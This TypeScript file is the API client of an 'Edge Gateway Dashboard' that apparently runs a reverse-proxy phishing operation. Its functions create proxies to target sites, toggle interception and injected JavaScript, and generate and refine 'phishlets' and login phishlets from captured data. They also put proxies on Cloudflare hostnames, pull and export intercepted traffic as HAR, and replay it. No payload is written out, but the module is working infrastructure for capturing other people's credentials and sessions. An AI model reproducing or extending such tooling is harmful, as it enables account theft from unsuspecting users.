// ── All API endpoint functions for the Edge Gateway Dashboard ──

import { getBaseUrl, safeFetch, readMeta, parse } from "./client";
import type {
  HealthResult, ItemsResult, Item,
  Proxy, CloudflareZone, ZonesResult,
  ReconInput, ReconResult, LoginPhishletInput,
  WorkerRoute, WorkerRoutesResult,
  InterceptCapture,
  TrafficResult,
  WorkerConfig,
  ReplayReport,
  IterateResult,
} from "./types";

const BASE = () => getBaseUrl();

// ── Health ───────────────────────────────────────────────────────────────────

export async function fetchHealth(): Promise<HealthResult> {
  const start = Date.now();
  const response = await safeFetch(`${BASE()}/health`, { cache: "no-store" });
  const latencyMs = Date.now() - start;
  const data = await parse<Omit<HealthResult, "meta">>(response);
  return { ...data, meta: readMeta(response, latencyMs) };
}

// ── Items ────────────────────────────────────────────────────────────────────

export async function fetchItems(): Promise<ItemsResult> {
  const start = Date.now();
  const response = await safeFetch(`${BASE()}/api/items`, { cache: "no-store" });
  const latencyMs = Date.now() - start;
  const data = await parse<{ data: Item[] }>(response);
  return { items: data.data, meta: readMeta(response, latencyMs) };
}

export async function createItem(
  input: { name: string; description: string },
  authHeader?: string,
): Promise<Item> {
  const headers: Record<string, string> = { "Content-Type": "application/json" };
  if (authHeader) headers["Authorization"] = authHeader;
  const response = await safeFetch(`${BASE()}/api/items`, {
    method: "POST",
    headers,
    body: JSON.stringify(input),
  });
  const data = await parse<{ data: Item }>(response);
  return data.data;
}

export async function updateItem(
  id: number,
  input: { name: string; description: string },
  authHeader?: string,
): Promise<Item> {
  const headers: Record<string, string> = { "Content-Type": "application/json" };
  if (authHeader) headers["Authorization"] = authHeader;
  const response = await safeFetch(`${BASE()}/api/items/${id}`, {
    method: "PUT",
    headers,
    body: JSON.stringify(input),
  });
  const data = await parse<{ data: Item }>(response);
  return data.data;
}

export async function deleteItem(id: number, authHeader?: string): Promise<void> {
  const headers: Record<string, string> = {};
  if (authHeader) headers["Authorization"] = authHeader;
  const response = await safeFetch(`${BASE()}/api/items/${id}`, {
    method: "DELETE",
    headers,
  });
  await parse<{ data: Item }>(response);
}

// ── Proxies ──────────────────────────────────────────────────────────────────

export async function fetchProxies(): Promise<Proxy[]> {
  const response = await safeFetch(`${BASE()}/api/proxies`, { cache: "no-store" });
  const data = await parse<{ data: Proxy[] }>(response);
  return data.data;
}

export async function createProxy(
  input: { name: string; targetUrl: string },
  authHeader?: string,
): Promise<Proxy> {
  const headers: Record<string, string> = { "Content-Type": "application/json" };
  if (authHeader) headers["Authorization"] = authHeader;
  const response = await safeFetch(`${BASE()}/api/proxies`, {
    method: "POST",
    headers,
    body: JSON.stringify(input),
  });
  const data = await parse<{ data: Proxy }>(response);
  return data.data;
}

export async function updateProxy(
  id: number,
  input: Partial<{ name: string; targetUrl: string; enabled: boolean; interceptEnabled: boolean; injectJs: string; injectJsEnabled: boolean; phishlet: string }>,
  authHeader?: string,
): Promise<Proxy> {
  const headers: Record<string, string> = { "Content-Type": "application/json" };
  if (authHeader) headers["Authorization"] = authHeader;
  const response = await safeFetch(`${BASE()}/api/proxies/${id}`, {
    method: "PUT",
    headers,
    body: JSON.stringify(input),
  });
  const data = await parse<{ data: Proxy }>(response);
  return data.data;
}

export async function deleteProxy(id: number, authHeader?: string): Promise<void> {
  const headers: Record<string, string> = {};
  if (authHeader) headers["Authorization"] = authHeader;
  const response = await safeFetch(`${BASE()}/api/proxies/${id}`, {
    method: "DELETE",
    headers,
  });
  await parse<{ data: Proxy }>(response);
}

export function proxyUrl(slug: string): string {
  return `${BASE()}/proxy/${slug}`;
}

// ── Cloudflare zones & routes ────────────────────────────────────────────────

export async function fetchCloudflareZones(authHeader?: string): Promise<ZonesResult> {
  const headers: Record<string, string> = {};
  if (authHeader) headers["Authorization"] = authHeader;
  const response = await safeFetch(`${BASE()}/api/cloudflare/zones`, {
    cache: "no-store",
    headers,
  });
  const text = await response.text();
  let zonesJson: { success?: boolean; configured?: boolean; data?: CloudflareZone[]; error?: string } = {};
  if (text) {
    try { zonesJson = JSON.parse(text); } catch { zonesJson = { success: false, error: "Invalid JSON response from gateway" }; }
  }
  if (!zonesJson.success) {
    return { configured: zonesJson.configured ?? false, zones: [], error: zonesJson.error };
  }
  return { configured: true, zones: zonesJson.data ?? [] };
}

export async function allocateProxyDomain(
  input: { proxyId: number; zoneId: string; hostname: string },
  authHeader?: string,
): Promise<{ hostname: string; target: string }> {
  const headers: Record<string, string> = { "Content-Type": "application/json" };
  if (authHeader) headers["Authorization"] = authHeader;
  const response = await safeFetch(`${BASE()}/api/cloudflare/allocate`, {
    method: "POST",
    headers,
    body: JSON.stringify(input),
  });
  const data = await parse<{ data: { hostname: string; target: string } }>(response);
  return data.data;
}

export async function fetchWorkerRoutes(authHeader?: string): Promise<WorkerRoutesResult> {
  const headers: Record<string, string> = {};
  if (authHeader) headers["Authorization"] = authHeader;
  const response = await safeFetch(`${BASE()}/api/cloudflare/worker-routes`, {
    cache: "no-store",
    headers,
  });
  const text = await response.text();
  let routesJson: { success?: boolean; configured?: boolean; data?: WorkerRoute[]; error?: string } = {};
  if (text) {
    try { routesJson = JSON.parse(text); } catch { routesJson = { success: false, error: "Invalid JSON response from gateway" }; }
  }
  if (!routesJson.success) {
    return { configured: routesJson.configured ?? false, routes: [], error: routesJson.error };
  }
  return { configured: true, routes: routesJson.data ?? [] };
}

export async function deleteWorkerRoute(
  routeId: string,
  zoneId: string,
  authHeader?: string,
): Promise<void> {
  const headers: Record<string, string> = {};
  if (authHeader) headers["Authorization"] = authHeader;
  const response = await safeFetch(`${BASE()}/api/cloudflare/worker-routes/${zoneId}/${routeId}`, {
    method: "DELETE",
    headers,
  });
  await parse<{ success: boolean }>(response);
}

// ── Intercepts ───────────────────────────────────────────────────────────────

export async function fetchIntercepts(authHeader?: string): Promise<InterceptCapture[]> {
  const headers: Record<string, string> = { "X-Intercept-TTL": "600" };
  if (authHeader) headers["Authorization"] = authHeader;
  const response = await safeFetch(`${BASE()}/api/intercepts`, {
    cache: "no-store",
    headers,
  });
  const data = await parse<{ data: InterceptCapture[]; count: number }>(response);
  return data.data;
}

export async function deleteIntercepts(authHeader?: string): Promise<void> {
  const headers: Record<string, string> = {};
  if (authHeader) headers["Authorization"] = authHeader;
  const response = await safeFetch(`${BASE()}/api/intercepts`, {
    method: "DELETE",
    headers,
  });
  await parse<{ success: boolean }>(response);
}

// ── Traffic ──────────────────────────────────────────────────────────────────

export async function fetchTraffic(): Promise<TrafficResult> {
  const start = Date.now();
  const response = await safeFetch(`${BASE()}/api/traffic`, { cache: "no-store" });
  const latencyMs = Date.now() - start;
  const data = await parse<{ data: TrafficResult["entries"]; stats: TrafficResult["stats"] }>(response);
  return { entries: data.data, stats: data.stats, meta: readMeta(response, latencyMs) };
}

// ── Worker config ────────────────────────────────────────────────────────────

export async function fetchWorkerConfig(authHeader?: string): Promise<WorkerConfig> {
  const headers: Record<string, string> = { "Content-Type": "application/json" };
  if (authHeader) headers["Authorization"] = authHeader;
  const response = await safeFetch(`${BASE()}/api/config`, {
    cache: "no-store",
    headers,
  });
  const data = await parse<{ data: WorkerConfig }>(response);
  return data.data;
}

export async function updateWorkerConfig(
  entries: Record<string, string>,
  authHeader?: string,
): Promise<WorkerConfig> {
  const headers: Record<string, string> = { "Content-Type": "application/json" };
  if (authHeader) headers["Authorization"] = authHeader;
  const response = await safeFetch(`${BASE()}/api/config`, {
    method: "PUT",
    headers,
    body: JSON.stringify(entries),
  });
  const data = await parse<{ data: WorkerConfig }>(response);
  return data.data;
}

export async function deleteWorkerConfig(authHeader?: string): Promise<WorkerConfig> {
  const headers: Record<string, string> = { "Content-Type": "application/json" };
  if (authHeader) headers["Authorization"] = authHeader;
  const response = await safeFetch(`${BASE()}/api/config`, {
    method: "DELETE",
    headers,
  });
  const data = await parse<{ data: WorkerConfig }>(response);
  return data.data;
}

// ── Recon ────────────────────────────────────────────────────────────────────

export async function generatePhishlet(
  proxyId: number,
  input: ReconInput,
  authHeader?: string,
): Promise<ReconResult> {
  const headers: Record<string, string> = { "Content-Type": "application/json" };
  if (authHeader) headers["Authorization"] = authHeader;
  const response = await safeFetch(`${BASE()}/api/proxies/${proxyId}/recon`, {
    method: "POST",
    headers,
    body: JSON.stringify(input),
  });
  const data = await parse<{ data: ReconResult }>(response);
  return data.data;
}

export async function generateLoginPhishlet(
  proxyId: number,
  input: LoginPhishletInput,
  authHeader?: string,
): Promise<ReconResult> {
  const headers: Record<string, string> = { "Content-Type": "application/json" };
  if (authHeader) headers["Authorization"] = authHeader;
  const response = await safeFetch(`${BASE()}/api/proxies/${proxyId}/login-phishlet`, {
    method: "POST",
    headers,
    body: JSON.stringify(input),
  });
  const data = await parse<{ data: ReconResult }>(response);
  return data.data;
}

export async function iteratePhishlet(
  proxyId: number,
  input: { phishlet: string; captured: NonNullable<ReconInput["captured"]> },
  authHeader?: string,
): Promise<IterateResult> {
  const headers: Record<string, string> = { "Content-Type": "application/json" };
  if (authHeader) headers["Authorization"] = authHeader;
  const response = await safeFetch(`${BASE()}/api/proxies/${proxyId}/recon/iterate`, {
    method: "POST",
    headers,
    body: JSON.stringify(input),
  });
  const data = await parse<{ data: IterateResult }>(response);
  return data.data;
}

// ── HAR export ───────────────────────────────────────────────────────────────

export async function fetchHarExport(authHeader?: string): Promise<{ harJson: string; fileName: string }> {
  const headers: Record<string, string> = {};
  if (authHeader) headers["Authorization"] = authHeader;
  const response = await safeFetch(`${BASE()}/api/intercepts/har`, {
    cache: "no-store",
    headers,
  });
  const text = await response.text();
  if (!response.ok) {
    let harErr: { error?: string } = {};
    if (text) { try { harErr = JSON.parse(text); } catch { /* ignore */ } }
    throw new Error(harErr.error ?? `HAR export failed (${response.status})`);
  }
  const disposition = response.headers.get("Content-Disposition") ?? "";
  const fileNameMatch = disposition.match(/filename[^;=\n]*=((['"]).*?\2|[^;\n]*)/);
  const fileName = fileNameMatch?.[1]?.replace(/['"]/g, "") ?? `edge-gateway-${new Date().toISOString().slice(0, 10)}.har`;
  return { harJson: text, fileName };
}

// ── Replay ───────────────────────────────────────────────────────────────────

export async function replayHar(
  input: { har: string; proxySlug: string },
  authHeader?: string,
): Promise<ReplayReport> {
  const headers: Record<string, string> = { "Content-Type": "application/json" };
  if (authHeader) headers["Authorization"] = authHeader;
  const response = await safeFetch(`${BASE()}/api/replay`, {
    method: "POST",
    headers,
    body: JSON.stringify(input),
  });
  const data = await parse<{ data: ReplayReport }>(response);
  return data.data;
}
